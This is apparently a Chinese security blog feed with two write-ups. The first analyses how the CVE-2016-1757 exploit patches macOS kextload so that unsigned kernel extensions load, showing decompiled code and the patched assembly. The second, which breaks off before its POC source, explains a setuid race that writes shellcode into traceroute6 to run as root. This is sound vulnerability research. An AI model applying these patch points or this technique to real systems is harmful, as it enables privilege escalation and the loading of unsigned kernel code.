    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>
<a id="more"></a>
<h1 id="0x01_数字签名与内核扩展">0x01 数字签名与内核扩展</h1><p>​    <code>OSX</code>系统在加载内核扩展时要求必须拥有苹果的开发者签名。在开发过程中，在自己的调试环境中可以通过修改参数加载没有签名的驱动，进行开发与调试。</p>
<h2 id="1-1_OS_X_10-11之后版本">1.1 OS X 10.11之后版本</h2><p>​    在OS X 10.11中引入的Rootless机制之后只需要关闭Rootless机制就可以加载没有签名的驱动扩展。细节可以参考这一篇文章。<a href="http://tadaland.com/os-x-rootless.html" target="_blank" rel="external">OS X 10.11中Rootless的实现与解释以及关闭方法</a></p>
<h2 id="1-2_OS_X_10-11之前版本">1.2 OS X 10.11之前版本</h2><p>​    在OS X 10.11之前的版本需要修改内核启动参数，并重启系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args=<span class="string">"kext-dev-mode=1"</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<h1 id="0x02_Patch详细分析">0x02 Patch详细分析</h1><p>​    通过对<code>kextload</code>程序patch前后的对比可以发现，总共对两个函数进行了patch。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/ida_diff.png" alt="ida_bindiff"></p>
<h2 id="2-1_sub_100020c9(check_root)">2.1 sub_100020c9(check_root)</h2><p>​    通过<code>bindiff</code>发现，<code>sub_100020c9</code>函数改变非常的大（rename成了check_root，不一定完全正确），patch前后对比如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindff_check_root.png" alt="check_root"></p>
<p>该函数内容被完全替换，直接返回0。</p>
<p>通过ida看一下替换前该函数的伪代码，可以大致了解该函数的作用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp-4h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  HIDWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( bootstrap_look_up(*(_DWORD *)bootstrap_port_ptr, <span class="string">"com.apple.KernelExtensionServer"</span>, (<span class="keyword">mach_port_t</span> *)&amp;v3 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( geteuid() )</span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">113L</span>L, <span class="string">"Can't contact kextd; must run as root to load kexts."</span>);</span><br><span class="line">      v1 = <span class="number">77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">115L</span>L, <span class="string">"Can't contact kextd; attempting to load directly into kernel."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_100004808 = <span class="number">1</span>;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(v3) )</span><br><span class="line">    mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, HIDWORD(v3));</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到返回0的情况有两种：</p>
<ul>
<li>能够获取到与<code>com.apple.KernelExtensionServer</code>通信的<code>port</code>。</li>
<li>没有获取到<code>port</code>，但是拥有<code>root</code>权限。</li>
</ul>
<p>逻辑比较简单，应该就是为后面的内核扩展加载检测一下权限和资源。<code>patch</code>后直接返回0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_sub_1000023bc">2.2 sub_1000023bc</h2><p>​    该函数相似度有99%，查看<code>patch</code>后的前后对比的具体细节，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindiff_check_sign.png" alt="bindiff_check_sign"></p>
<p>通过<code>nop</code>指令，干掉了对<code>sub_100000979</code>函数的调用。直接通过<code>xor</code>指令清零<code>eax</code>。</p>
<p>查看<code>sub_100000979</code>的伪代码，看看该函数究竟做了些什么。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_sign</span><span class="params">(__int64 a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r13@1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// r15@1</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@1</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@5</span></span><br><span class="line">  __CFString *v11; <span class="comment">// rdi@5</span></span><br><span class="line">  __int64 v12; <span class="comment">// rsi@10</span></span><br><span class="line">  __int64 v14; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  __int64 v15; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a2;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = -<span class="number">67061</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v7) = OSKextGetURL();</span><br><span class="line">    LODWORD(v8) = CFURLCopyAbsoluteURL(v7);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SecStaticCodeCreateWithPath(v8, <span class="number">0L</span>L, &amp;v15) || !v15 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      LODWORD(v10) = OSKextGetIdentifier(a1);</span><br><span class="line">      v11 = &amp;cfstr_AnchorApple;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)CFStringHasPrefix(v10, &amp;cfstr_Com_apple_) )</span><br><span class="line">        v11 = &amp;cfstr_AnchorAppleGen;</span><br><span class="line">      <span class="keyword">if</span> ( SecRequirementCreateWithString(v11, <span class="number">0L</span>L, &amp;v14) || !v14 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">        OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">        v6 = -<span class="number">67061</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          v12 = <span class="number">536870913L</span>L;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v12 = <span class="number">1073741825L</span>L;</span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        <span class="comment">//签名检测</span></span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        v6 = SecStaticCodeCheckValidity(v15, v12);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp;&amp; v6 &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_100000B19(v5, v9, <span class="number">1L</span>L) )</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      CFRelease(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        CFRelease(v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">      v6 = -<span class="number">67061</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      CFRelease(v14);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最核心的就是调用了<code>SecStaticCodeCheckValidity</code>这个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	Performs static validation on the given SecStaticCode object. The call obtains and</span><br><span class="line">	verifies the signature on the code object. It checks the validity of all</span><br><span class="line">	sealed components (including resources, if any). It validates the code against</span><br><span class="line">	a SecRequirement if one is given. The call succeeds if all these conditions</span><br><span class="line">	are satisfactory. It fails otherwise.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*蹩脚的翻译一下</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	认证传入的SecStaticCode对象的合法性，该函数调用获取并检测数字签名的合法性。</span><br><span class="line">	认证内容包含了所有的组件(如果存在资源文件同样会检测)。</span><br><span class="line">	如果提供了加密的内容，也会对加密部分进行认证。</span><br><span class="line">	当所有条件满足时函数调用返回成功。</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>这是该函数在头文件中的定义。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>​    经过测试确实可以绕过数字签名的检测成功加载了未签名的内核扩展。</p>
<p>​    通过对<code>kextload</code>的<code>patch</code>，绕过两个检测函数，从而达到了绕过<code>OSX</code>系统对驱动扩展的签名检测，结合<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>的<code>root</code>权限执行任意代码，从而实现了，普通用户可以加载任意未签名的内核扩展。</p>
<h1 id="0x04_勘误">0x04 勘误</h1><p>​    由于不够严谨，遗漏了一个patch的点，这里补上。更详细的原理在<code>exploit</code>的分析文章中可以看到。</p>
<h2 id="4-1_sub_1000023BC">4.1 sub_1000023BC</h2><p>在<code>sub_1000023BC</code>函数中的对sub_085c的调用被patch修改绕过签名验证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">0000000100002802</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">0000000100002807</span>                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">000000010000280</span>A                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">000000010000280</span>D                 call    sub_10000085C</span><br><span class="line">__text:<span class="number">0000000100002812</span>                 test    eax, eax</span><br><span class="line">__text:<span class="number">0000000100002814</span>                 mov     r12, r14</span><br><span class="line">__text:<span class="number">0000000100002817</span>                 mov     r14, [rbp+var_CD0]</span><br><span class="line">__text:<span class="number">000000010000281</span>E                 jnz     loc_1000028FA</span><br></pre></td></tr></table></figure>
<p>patch后代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">000000010000277</span>E                 mov     r14, r12</span><br><span class="line">__text:<span class="number">0000000100002781</span>                 movzx   r12d, [rbp+var_CB9]</span><br><span class="line">__text:<span class="number">0000000100002789</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">000000010000278</span>E                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">0000000100002791</span>                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">0000000100002794</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002795</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002796</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002797</span>                 xor     eax, eax</span><br><span class="line">__text:<span class="number">0000000100002799</span>                 mov     ebx, eax</span><br><span class="line">__text:<span class="number">000000010000279</span>B                 test    ebx, ebx</span><br></pre></td></tr></table></figure>
<p><code>bindiif</code>如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/kanwu1.png" alt="勘误1"></p>
<h1 id="ps:">ps:</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>]]>
    
    </summary>
    
      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
    
      <category term="kextload" scheme="http://yoursite.com/tags/kextload/"/>
    
      <category term="patch" scheme="http://yoursite.com/tags/patch/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757简单分析]]></title>
    <link href="http://yoursite.com/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/04/03/CVE-2016-1757简单分析/</id>
    <published>2016-04-03T17:49:24.000Z</published>
    <updated>2016-04-29T19:07:36.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>灵犀一指可攻可守，进攻时也是一指，是天下第一指法，与移花接玉这个天下第一掌法同样都是非兵刃的第一绝技</p>
<p>—陆小凤传奇</p>
</blockquote>
<p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>
<a id="more"></a>
<h1 id="0x01_基础知识">0x01 基础知识</h1><h2 id="1-1_exec函数流程">1.1 exec函数流程</h2><p>我在<a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="external">OSX内核加载mach-o流程分析</a>中比较详细的分析了<code>exec</code>整个执行流程中比较重要的几个函数，这个是比较精简的一个流程图。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="exec函数图"></p>
<h1 id="1-2_mach_vm_*_API">1.2 mach_vm_* API</h1><p><code>Mach</code>提供了一种用户层对虚拟内存的操作方式。一系列对<code>vm_map_t</code>作出操作的<code>API</code>可以对虚拟内存作出很多操作。这里的<code>vm_map_t</code>就是<code>PORT</code>。</p>
<p>这一系列的API有很多，这里只是简单的介绍一下POC中会使用到的API。</p>
<h3 id="1-2-1_mach_vm_allocate">1.2.1 mach_vm_allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mach_vm_allocate(<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,<span class="keyword">mach_vm_address_t</span> *address,<span class="keyword">mach_vm_size_t</span> size,<span class="keyword">int</span> flags);</span><br></pre></td></tr></table></figure>
<p>在<code>map</code>中分配<code>size</code>个字节大小的内存，根据<code>flags</code>的不同会有不同的处理方式。<code>address</code>是一个<code>I/O</code>的参数（例如：获取分配后的内存大小）。</p>
<p>如果<code>flags</code>的值不是<code>VM_FLAGS_ANYWHERE</code>，那么内存将被分配到<code>address</code>指向的地址。                                                            </p>
<h3 id="1-2-2_mach_vm_region">1.2.2 mach_vm_region</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_region(</span><br><span class="line">	<span class="keyword">vm_map_t</span>		 <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	*address,		<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_vm_size_t</span>	*size,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">vm_region_flavor_t</span>	 flavor,		<span class="comment">/* IN */</span></span><br><span class="line">	<span class="keyword">vm_region_info_t</span>	 info,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">mach_msg_type_number_t</span>	*count,			<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_port_t</span>		*object_name)		<span class="comment">/* OUT */</span></span><br></pre></td></tr></table></figure>
<p>获取<code>map</code>指向的任务内，<code>address</code>地址起始的VM region（虚拟内存区域）的信息。目前标记为<code>flavor</code>只有<code>VM_BASIC_INFO_64</code>。            </p>
<p>获得的info的数据结构如下。                                                </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm_region_basic_info_64 &#123;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		protection;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		max_protection;</span><br><span class="line">	<span class="keyword">vm_inherit_t</span>		inheritance;</span><br><span class="line">	<span class="keyword">boolean_t</span>		shared;</span><br><span class="line">	<span class="keyword">boolean_t</span>		reserved;</span><br><span class="line">	<span class="keyword">memory_object_offset_t</span>	offset;</span><br><span class="line">	<span class="keyword">vm_behavior_t</span>		behavior;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		user_wired_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-3_mach_vm_protect">1.2.3 mach_vm_protect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_protect(</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> task,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> address,</span><br><span class="line">	<span class="keyword">mach_vm_size_t</span> size,</span><br><span class="line">	<span class="keyword">boolean_t</span> set_maximum,</span><br><span class="line">	<span class="keyword">vm_prot_t</span> new_protection)</span><br></pre></td></tr></table></figure>
<p>对<code>address</code>到<code>address+size</code>这一段的内存设置内存保护策略,<code>new_protection</code>就是最后设置成为的保护机制。</p>
<h3 id="1-2-4_mach_vm_write">1.2.4 mach_vm_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_write(</span><br><span class="line">	<span class="keyword">vm_map_t</span>			<span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span>		address,</span><br><span class="line">	<span class="keyword">pointer_t</span>			data,</span><br><span class="line">	__unused <span class="keyword">mach_msg_type_number_t</span>	size)</span><br></pre></td></tr></table></figure>
<p>对<code>address</code>指向的内存改写内容。</p>
<h1 id="1-3_Ports">1.3 Ports</h1><p><code>Ports</code>是一种<code>Mach</code>提供的<code>task</code>之间相互交互的机制，通过<code>Ports</code>可以完成类似进程间通信的行为。每个<code>Ports</code>都会有自己的权限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND		((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) <span class="number">6</span>)</span></span><br></pre></td></tr></table></figure>
<p><code>Ports</code>可以在不同的<code>task</code>之间传递，通过传递可以赋予其他<code>task</code>对<code>ports</code>的操作权限。例如POC中使用的就是在父进程与子进程之间传递<code>Port</code>得到了对内存操作的权限。</p>
<h1 id="0x02_漏洞原理">0x02 漏洞原理</h1><p>​    在内核处理setuid的程序时存在一个时间窗口，通过这个时间窗口，在进程<code>Port</code>被关闭之前，拥有进程<code>Port</code>的程序可以改写目标进程的任意内存，通过改写内存可以利用目标进程的root权限执行任意的shellcode。</p>
<h2 id="2-1_execv流程漏洞">2.1 execv流程漏洞</h2><p><img src="https://2.bp.blogspot.com/-lw-AyicBVT0/VvGCDuX_AZI/AAAAAAAABRk/sjk9rPkkGhMsrNI6ZkVxNexTffskLBs0Q/s1600/2016-03-22_2.png" alt="流程图"><br><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-4_load_machfile" target="_blank" rel="external">load_machfile源码分析</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-3_exec_mach_imgact" target="_blank" rel="external">exec_mach_imgact源码分析</a></p>
<p>在swap_task_map以及exec_handle_suid之间有一个时间窗口，task port还是可以对内存做出修改的。</p>
<p>具体细节可以参考poc，同时也可以参考源码的分析日志。</p>
<h3 id="2-2_捕获时间窗口(灵犀一指)">2.2 捕获时间窗口(灵犀一指)</h3><p>​    时间窗口打开的时机对编写poc非常重要，因为在调用exec之后整个行为都是内核控制的，没有什么直接的办法获取时间窗口，poc中提供的方法是通过不断的调用<code>mach_vm_region</code>，当窗口出现时，也就是从old_map切换到new_map时，<code>mach_vm_region</code>函数获取的address应该是不同的。具体实现在下面的poc源码分析中会提到。</p>
<h3 id="2-3_任意内存写">2.3 任意内存写</h3><p>​    在得到窗口打开的时机之后通过上面提到的port以及mach_vm_*的一系列函数就可以做到对目标进程的任意写操作，从而写入shellcode。</p>
<h3 id="2-4_shellcode的执行(移花接木)">2.4 shellcode的执行(移花接木)</h3><p>​    shellcode要写在什么地方才会被执行呢？    </p>
<p>​    通过对traceroute6的分析，可以看到__text的地址偏移是0x153c，所以通过对该地址的内存改写，可以使得shellcode得到执行。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/shellcode.png" alt="traceroute6"></p>
<h1 id="0x03_POC源码分析">0x03 POC源码分析</h1><h2 id="3-1_main">3.1 main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 